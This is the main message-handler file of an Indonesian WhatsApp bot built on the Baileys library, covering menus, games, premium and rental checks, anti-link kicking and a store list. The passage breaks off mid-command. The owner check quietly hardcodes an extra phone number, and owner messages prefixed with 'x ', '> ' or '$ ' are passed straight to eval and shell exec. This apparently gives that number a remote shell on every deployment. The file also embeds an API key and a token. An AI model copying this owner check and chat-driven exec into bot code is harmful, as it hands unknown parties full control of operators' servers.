"use strict";
const { downloadContentFromMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys")
const fs = require ("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const xfar = require('xfarr-api');
const axios = require("axios");
const hxz = require("hxz-api");
const ra = require("ra-api");
const kotz = require("kotz-api");
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const toMS = require("ms");
const FormData = require("form-data");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const path = require('path')

// Lib
const { color, bgcolor } = require('../lib/color')
const msgFilter = require("../lib/antispam");
const { getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, makeid } = require("../lib/myfunc");
const { webp2mp4File } = require("../lib/convert")
const { pinterest } = require("../lib/pinterest")
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const { addPlayGame, getJawabanGame, isPlayGame, cekWaktuGame, getGamePosi } = require("../lib/game");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('../lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('../lib/setleft');
const { getPosiMenu, getPosiCmd, getAnswerCmd, getPosiRows } = require("../lib/respon-list");
const { addRespons, checkRespons, deleteRespons } = require('../lib/respon');
const tictac = require("../lib/tictac");
const _prem = require("../lib/premium");
const _sewa = require("../lib/sewa");

// Exif
const Exif = require("../lib/exif")
const exif = new Exif()

// DB Game
let tictactoe = [];
let tebakgambar = []

// Database
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./message/mess.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

// Apikeys
let apikeys = 'FADLYGANTENG'

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async(xnone, msg, m, setting, store, welcome, left, set_welcome_db, set_left_db, db_respon_list, sewa, opengc) => {
	try {
        let { ownerNumber, ownerName, botName, gamewaktu, limitCount } = setting
        let footxt = `${setting.footer} || ${pendaftar.length} USER ❤️`
        let instagram = `${setting.instagram}`
        let mygc = `${setting.mygc}`
        let thumb = fs.readFileSync(setting.pathimg)
        let { allmenu, simpleMenu, stickerMenu, gabutMenu, groupMenu, sistemMenu, storeMenu, downloadMenu, gameMenu, randomMenu, searchMenu, makerMenu, ownerMenu, otherMenu, tos, rules } = require('./help')
        const { type, quotedMsg, mentioned, now, fromMe } = msg
        if (msg.isBaileys) return
        const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        const tanggal = moment().format("ll")
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
        const ucapanWaktu = "Selamat "+fildt.charAt(0).toUpperCase() + fildt.slice(1)
        const content = JSON.stringify(msg.message)
        const from = msg.key.remoteJid
        const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type == "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (type == "messageContextInfo") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const toJSON = j => JSON.stringify(j, null,'\t')
        if (xnone.multi) {
        	var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        } else {
        	if (xnone.nopref) {
                prefix = ''
        	} else {
                prefix = xnone.prefa
        	}
        }
        const args = chats.split(' ')
        const command = chats.toLowerCase().split(' ')[0] || ''
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const isCmd = command.startsWith(prefix)
        const isGroup = msg.key.remoteJid.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
        const isOwner = ownerNumber == sender ? true : sender == "62895324463608@s.whatsapp.net" ? true : false
        const pushname = msg.pushName
        const q = chats.slice(command.length + 1, chats.length)
        const body = chats.startsWith(prefix) ? chats : ''
        const botNumber = xnone.user.id.split(':')[0] + '@s.whatsapp.net'
        const groupMetadata = isGroup ? await xnone.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender)
        const isAntiLink = isGroup ? antilink.includes(from) ? true : false : false
        const isAntiWame = isGroup ? antiwame.includes(from) ? true : false : false
        const isWelcome = isGroup ? welcome.includes(from) ? true : false : false
        const isLeft = isGroup ? left.includes(from) ? true : false : false
        const isUser = pendaftar.includes(sender)
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        
        const gcounti = setting.gcount
        const gcount = isPremium ? gcounti.prem : gcounti.user

        const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
            mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        
        let timestamp = speed();
        let latensi = speed() - timestamp
        
        async function downloadAndSaveMediaMessage (type_file, path_file) {
        	if (type_file === 'image') {
                var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'video') {
                var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'sticker') {
                var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'audio') {
                var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	}
        }
        const sendFileFromUrl = async (from, url, caption, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headerd["content-type"]
            let type = mime.split("/")[0]+"Message"
            if (mime.split("/")[0] === "image") {
               var img = await getBuffer(url)
               return xnone.sendMessage(from, { image: img, caption: caption }, options)
            } else if (mime.split("/")[0] === "video") {
               var vid = await getBuffer(url)
               return xnone.sendMessage(from, { video: vid, caption: caption }, options)
            } else if (mime.split("/")[0] === "audio") {
               var aud = await getBuffer(url)
               return xnone.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
            } else {
               var doc = await getBuffer(url)
               return xnone.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
            }
        }
        async function sendPlay(from, query) {
           var url = await yts(query)
           url = url.videos[0].url
           hxz.youtube(url).then(async(data) => {
             var button = [{ urlButton: { displayText: `Source Code`, url : `${url}` } }, { quickReplyButton: { displayText: `🎵 Audio`, id: `${prefix}ytmp3 ${url}` } }, { quickReplyButton: { displayText: `🎥 Video`, id: `${prefix}ytmp4 ${url}` } }]
             xnone.sendMessage(from, { caption: `*Title :* ${data.title}\n*Quality :* ${data.quality}\n*Audio Size :* ${data.size_mp3}\n*Video Size :* ${data.size}\n*Url :* https://youtu.be/${data.id}`, location: { jpegThumbnail: await getBuffer(data.thumb) }, templateButtons: button, footer: 'Pilih Salah Satu Button Dibawah⬇️', mentions: [sender] })
           }).catch((e) => {
             xnone.sendMessage(from, { text: mess.error.api }, { quoted: msg })
               ownerNumber.map( i => xnone.sendMessage(from, { text: `Send Play Error : ${e}` }))
           })
        }
        function hitungmundur(bulan, tanggal) {
          let from = new Date(`${bulan} ${tanggal}, 2022 00:00:00`).getTime();
          let now = Date.now();
          let distance = from - now;
          let days = Math.floor(distance / (1000 * 60 * 60 * 24));
          let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
          let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
          let seconds = Math.floor((distance % (1000 * 60)) / 1000);
          return days + "Hari " + hours + "Jam " + minutes + "Menit " + seconds + "Detik"
        }
        const isUrl = (url) => {
        	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function monospace(string) {
            return '```' + string + '```'
        }
        function clockString(ms) {
            let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
            let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
            let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
            return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
        }
        function randomNomor(min, max = null) {
          if (max !== null) {
        	min = Math.ceil(min);
        	max = Math.floor(max);
        	return Math.floor(Math.random() * (max - min + 1)) + min;
          } else {
        	return Math.floor(Math.random() * min) + 1
          }
        }
        const pickRandom = (arr) => {
        	return arr[Math.floor(Math.random() * arr.length)]
        }
        function mentions(teks, mems = [], id) {
        	if (id == null || id == undefined || id == false) {
        	  let res = xnone.sendMessage(from, { text: teks, mentions: mems })
        	  return res
        	} else {
              let res = xnone.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
              return res
             }
        }
        const reply = (teks) => {
        	xnone.sendMessage(from, { text: teks }, { quoted: msg })
        }
        const textImg = (teks) => {
        	return xnone.sendMessage(from, { text: teks, jpegThumbnail: fs.readFileSync(setting.pathimg) }, { quoted: msg })
        }
        const sendMess = (hehe, teks) => {
        	xnone.sendMessage(hehe, { text: teks })
        }
        const buttonWithText = (from, text, footer, buttons) => {
        	return xnone.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
        }
        const sendContact = (jid, numbers, name, quoted, mn) => {
        	let number = numbers.replace(/[^0-9]/g, '')
        	const vcard = 'BEGIN:VCARD\n' 
        	+ 'VERSION:3.0\n' 
        	+ 'FN:' + name + '\n'
        	+ 'ORG:;\n'
        	+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
        	+ 'END:VCARD'
        	return xnone.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
        }
        
        const buttonsDefault = [
        	{ urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	{ quickReplyButton: { displayText: `Menu Bot`, id: `${prefix}help` } },
        	{ quickReplyButton: { displayText: `Owner Bot`, id: `${prefix}owner` } },
        	{ quickReplyButton: { displayText: `Syarat & Ketentuan`, id: `${prefix}snk` } }
        ]
        
        const buttonsDonate = [
            { urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	{ quickReplyButton: { displayText: `Menu`, id: `${prefix}help` } },
        	{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
        ]
        
        const buttonsTiktod = [
            { urlButton: { displayText: `Source Code`, url : `${args[1]}` } },
        	{ quickReplyButton: { displayText: `Get Audio`, id: `${prefix}tiktokaudio ${args[1]}` } }
        ]
        
        const buttonsWiki = [
            { urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	{ quickReplyButton: { displayText: `Menu`, id: `${prefix}help` } },
        	{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
        ]
        
        const buttonsBc = [
            { urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        ]
        
        const buttonsSetGc = [
            { urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
            { quickReplyButton: { displayText: `Enable`, id: `${command} enable` } },
        	{ quickReplyButton: { displayText: `Disable`, id: `${command} disable` } }
        ]
        
        const buttonsGame = [
            { urlButton: { displayText: `Follows Sekarang !`, url : `https://instagram.com/${instagram}` } },
        	{ quickReplyButton: { displayText: `🕹️ Play Again 🕹️`, id: `${command}` } }
        	]
        
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedMsg = (type == 'extendedTextMessage')
        const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
        const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

        /*const order = generateWAMessageFromContent(from, proto.Message.fromObject({
        "orderMessage": {
            "orderId": "667140254502463", // Ganti Idnya
            "thumbnail": fs.readFileSync(setting.pathimg),
            "itemCount": 2022,
            "status": "INQUIRY",
            "surface": "CATALOG",
            "orderTitle": "© Divaa Cnci",
            "message":"Hello World",
            "sellerJid": "62895379169488@s.whatsapp.net",
            "token": "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==",
            "totalAmount1000": "99999999999999999999",
            "totalCurrencyCode": "USD",
            }
        }), { userJid: from, quoted: msg })
       xnone.relayMessage(from, order.message, { messageId: order.key.id})*/
       
       // SPAM
        const spampm = () => {
            console.log(color('[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))
            msgFilter.addSpam(sender, xnone.spam)
            if (msgFilter.isSpam(sender, xnone.spam)){
                addBanned(sender, '30m', ban)
                reply(`Kamu melakukan spam\nKamu akan diban selama 30menit`)
            } else {
            reply(`Hai\nKamu terdeteksi menggunakan command tanpa jeda\nHarap tunggu 5 detik`)
            }
        }
        const spamgr = () => {
            console.log(color('[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
            msgFilter.addSpam(sender, xnone.spam)
            if (msgFilter.isSpam(sender, xnone.spam)){
                addBanned(sender, '30m', ban)
                reply(`Kamu melakukan spam\nKamu akan diban selama 30menit`)
            } else {
            reply(`Hai\nKamu terdeteksi menggunakan command tanpa jeda\nHarap tunggu 5 detik`)
            }
        }
        
        //  Anti spam
        msgFilter.ResetSpam(xnone.spam)

       // Mode
        if (xnone.mode === 'self'){
            if (!isOwner && !fromMe) return
        }

        // Auto Read & Presence Online
        xnone.sendReadReceipt(from, sender, [msg.key.id])
        xnone.sendPresenceUpdate('available', from)
        
        // Auto Registrasi
        if (isCmd && !isUser) {
          pendaftar.push(sender)
          fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
        }
        
        // Premium
        _prem.expiredCheck(xnone, premium)
        
        // Sewa
        _sewa.expiredCheck(xnone, sewa)
        
        // Posi Store
        if (type == "messageContextInfo" || type == "listResponseMessage" && isGroup) {
            var posiStore = getPosiMenu(from, listStore)
            if (posiStore !== null) {
                var dataStore = listStore[posiStore].cmd
                for (var i = 0; i < dataStore.length; i++) {
                    if (chats === dataStore[i].menu) {
                        reply(dataStore[i].harga)
                    }
                }
            var posiCmd = getPosiCmd(chats, dataStore)
            if (posiCmd == null) reply(`${chats} tidak terdaftar lagi di list`)
            }
        }
        
        // Tictactoe
        if (isTicTacToe(from, tictactoe)) {
            tictac(xnone, chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)
        }
        
        // Game
        cekWaktuGame(xnone, tebakgambar)
        if (isPlayGame(from, tebakgambar) && isUser) {
          if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
            var htgm = randomNomor(100, 150)
        	addBalance(sender, htgm, balance)
            xnone.sendMessage(from, { text: `*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakgambar)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? klik button dibawah atau ketik *${prefix}tebakgambar*`, footer: footxt, templateButtons: buttonsGame })
            tebakgambar.splice(getGamePosi(from, tebakgambar), 1)
          }
        }
        
        // ANTI SPAM
        if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
        if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
        if (isCmd && !isOwner && !isPremium) msgFilter.addFilter(sender)
        
        if (chats.startsWith("x ") && isOwner) {
        console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
          const ev = (sul) => {
            var sat = JSON.stringify(sul, null, 2)
            var bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return reply(bang)
          }
          try {
           reply(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)))
          } catch (e) {
           reply(util.format(e))
          }
        } else if (chats.startsWith("$ ") && isOwner) {
        console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
          exec(chats.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`)
            if (stdout) reply(`${stdout}`)
          })
        } else if (chats.startsWith("> ") && isOwner) {
	    console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkaokwoak`))
         try {
	       let evaled = await eval(chats.slice(2))
           if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
        	reply(`${evaled}`)
         } catch (err) {
           reply(`${err}`)
         }
        }
        
        // Anti link
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                xnone.groupParticipantsUpdate(from, [sender], "remove")
            }
        }
        
        // Anti wame
        if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (chats.match(/(wa.me\/)/gi)) {
                reply(`*「 NOMOR LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link nomor, maaf kamu akan di kick`)
                xnone.groupParticipantsUpdate(from, [sender], "remove")
            }
        }
        
        // Logs;
        if (!isGroup && isCmd && !fromMe) {
        	addBalance(sender, randomNomor(20), balance)
        	console.log(color('[ CMD ]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        }
        if (isGroup && isCmd && !fromMe) {
        	addBalance(sender, randomNomor(20), balance)
        	console.log(color('[ CMD ]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        }

        function triggerSticker() {
            try {
                for (let x = 0; x < responDB.length; x++) {
                    if (msg.message.stickerMessage.fileSha256.toString('hex') == responDB[x].hex) {
                        return responDB[x].balasan;
                    }
                }
            } catch {
                return false;
            }
        }
        switch (command || triggerSticker()) {
        case 'cekprefix':
            reply(`*Prefix saat ini adalah : ${prefix}*`)
            break
        case prefix+'menu': 
            let menuwh = `Halo Kak ${pushname} 👋🏻
Salam kenal, Aku Bot ${setting.ownerName}
Asisten Kamu masa kini

Silahkan pilih button djbawah ini
jika tidak support button ketik #help`
            xnone.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumb }, templateButtons: buttonsDefault, footer: footxt, mentions: [sender] })
            break
        case prefix+'help':
            let mundur = hitungmundur(7, 30)
            let teks = allmenu(ucapanWaktu, sender, mundur, prefix, jam, tanggal, runtime, pushname, isOwner, isPremium, balance, limit, limitCount, glimit, gcount)
            mentions(teks, [sender], true)
            break
        case prefix+'tos': case prefix+'donate': case prefix+'donasi':
            let tosny = tos(pushname)
            xnone.sendMessage(from, { caption: tosny, image: { url: `${setting.qrisimg}` }, templateButtons: buttonsDonate, footer: footxt, mentions: [sender] })
            break
        case prefix+'snk': case prefix+'rules': case prefix+'rule':
            let butSnk = [
        	{ urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	{ quickReplyButton: { displayText: `Menu`, id: `${prefix}help` } },
        	{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
        	]
        	buttonWithText(from, `${rules(prefix)}`, footxt, butSnk)
            break
        case prefix+'owner': case prefix+'author': case prefix+'creator': case prefix+'developer':
            for (let x of ownerNumber) {
			    sendContact(from, x.split('@s.whatsapp.net')[0], `${setting.ownerName}`, msg)
			    .then((res) => xnone.sendMessage(from, { text: 'Tuh Nomor Ownerku 😍' }, {quoted: res}))
            }
			break
        case prefix+'runtime':
            let butRun = [
        	{ urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	]
        	xnone.sendMessage(from, { caption: 'Active During', document: { url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx' }, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: '© Divaa Cnci', templateButtons: butRun, footer: `${runtime(process.uptime())}`, mentions: [sender] })
            break
        case prefix+'speed': case prefix+'ping':
            let spd = `${latensi.toFixed(4)} Second`
            let butSinyal = [
        	{ urlButton: { displayText: `My Group`, url : `${mygc}` } },
        	{ urlButton: { displayText: `Instagram`, url : `https://instagram.com/${instagram}` } },
        	]
        	xnone.sendMessage(from, { caption: 'SPEEDTEST', document: { url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx' }, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: '© Divaa Cnci', templateButtons: butSinyal, footer: spd, mentions: [sender] })
            break
        case prefix+'cekprem':
        case prefix+'cekpremium':
            if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
            if (isOwner) return reply(`Lu owner bego!`)
            if (_prem.getPremiumExpired(sender, premium) == "PERMANENT") return reply(`PERMANENT`)
            let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
            let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
            reply(premiumnya)
            break
        case prefix+'listprem':
            let txt = `List Prem\nJumlah : ${premium.length}\n\n`
            let men = [];
            for (let i of premium) {
                men.push(i.id)
                txt += `*ID :* @${i.id.split("@")[0]}\n`
                if (i.expired === 'PERMANENT') {
                    let cekvip = 'PERMANENT'
                    txt += `*Expire :* PERMANENT\n\n`
            } else {
                let cekvip = ms(i.expired - Date.now())
                txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                }
            }
            mentions(txt, men, true)
            break
        case prefix+'simi':
            if (isGroup)return reply("Hanya bisa di lakukan di chat pribadi:)")
            const cimcimi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
            xnone.sendMessage(from, { text: cimcimi.success })
            break
        case prefix+'aco':
            if (isGroup)return reply("Hanya bisa di lakukan di chat pribadi:)")
            const acoo = await fetchJson(`https://api-toxic-devil.herokuapp.com/api/ai/aco?text=${q}&lang=id&id=62895379169488`)
            xnone.sendMessage(from, { text: acoo.response })
            break
        case prefix+'cekapikey': case prefix+'cekkey': case prefix+'cekapi':
            if (args.length < 2) return reply(`Kirim perintah ${command} apikey`)
            let ingpo = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${q}`)
            let hasilnyaa = `*CEK APIKEY*\n\nUsername : ${ingpo.result.username}\nRequests : ${ingpo.result.requests}\nRequests Today : ${ingpo.result.today}\nType : i${ingpo.result.account_type}\nExpired : ${ingpo.result.expired}`
            reply(hasilnyaa)
            break
        /*case prefix+'report': case prefix+'bugreport':
            if (args.length < 2) return reply(`Kirim perintah ${command} laporan`)
            reply(`Sukses Kirim Ke Owner, Main² banned!`)
            for (let i of ownerNumber) {
                xnone.reply(i, `*[ PANGGILAN USER ]*\nMessage nya : ${q}`, msg)
            }
            break
        case prefix+'request':
            if (args.length < 2) return reply(`Kirim perintah ${command} request`)
            reply(`Sukses Kirim Ke Owner, Thanks Request nya`)
            for (let i of ownerNumber) {
                xnone.reply(i, `*[ REQUEST USER ]*\nReqest nya : ${q}`, msg)
            }
            break*/
            
        // List Menu DB
        case prefix+'menusimple': case prefix+'simplemenu': case prefix+'menusimpel': case prefix+'simpelmenu':
            reply(simpleMenu(prefix))
            break
        case prefix+'menusticker': case prefix+'stickermenu': case prefix+'menustiker': case prefix+'stikermenu':
            reply(stickerMenu(prefix))
            break
        
        case prefix+'menugabut': case prefix+'gabutmenu':
            reply(gabutMenu(prefix))
            break
        case prefix+'menugroup': case prefix+'groupmenu': case prefix+'menugrup': case prefix+'grupmenu':
            reply(groupMenu(prefix))
            break
        case prefix+'menusistem': case prefix+'sistemmenu':
            reply(sistemMenu(prefix))
            break
        case prefix+'menustore': case prefix+'storemenu':
            reply(storeMenu(prefix))
            break
        case prefix+'menudownload': case prefix+'downloadmenu':
            reply(downloadMenu(prefix))
            break
        case prefix+'menugame': case prefix+'gamemenu':
            reply(gameMenu(prefix))
            break
        case prefix+'menurandom': case prefix+'randommenu':
            reply(randomMenu(prefix))
            break
        case prefix+'menusearch': case prefix+'searchmenu':
            reply(searchMenu(prefix))
            break
        case prefix+'menumaker': case prefix+'makermenu':
            reply(makerMenu(prefix))
            break
        case prefix+'menuowner': case prefix+'ownermenu':
            reply(ownerMenu(prefix))
            break
        case prefix+'menuother': case prefix+'othermenu':
            reply(otherMenu(prefix))
            break

        // Store Menu
        case prefix+'list':
            if (!isGroup) return reply(mess.OnlyGrup)
            var cekPosi = getPosiMenu(from, listStore)
            if (cekPosi == null) return reply(`Belum ada list message yang terdaftar di group ini`)
            var data = listStore[cekPosi]
            var listMsg = {
                text: "Silahkan Pilih Produk Nya",
                buttonText: "Click Here!",
                footer: footxt,
                sections: data.sections
            }
            xnone.sendMessage(from, listMsg)
            break
        case prefix+'addlist': case prefix+'listadd':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var cekPos = getPosiMenu(from, listStore)
            if (args.length < 2) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (!q.includes('@')) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            var menu = q.split('@')[0]
            var harga = q.split('@')[1].replace(' ', ' ')
            if (q.split('@').length > 2) {
                harga = ''
                var aoa = q.split('@')
                for (let i of aoa) {
                    if (i !== menu) harga += i
                }
            }
            if (cekPos == null) {
                var isi = {
                    jid: from,
                    cmd: [{ menu, harga }],
                    sections: [
                        {
                            title: `${groupName}`,
                            rows: [
                                { title: menu, rowId: menu }
                            ]
                        }
                    ]
                }
                listStore.push(isi)
                fs.writeFileSync('./database/list-message.json', JSON.stringify(listStore, null, 2))
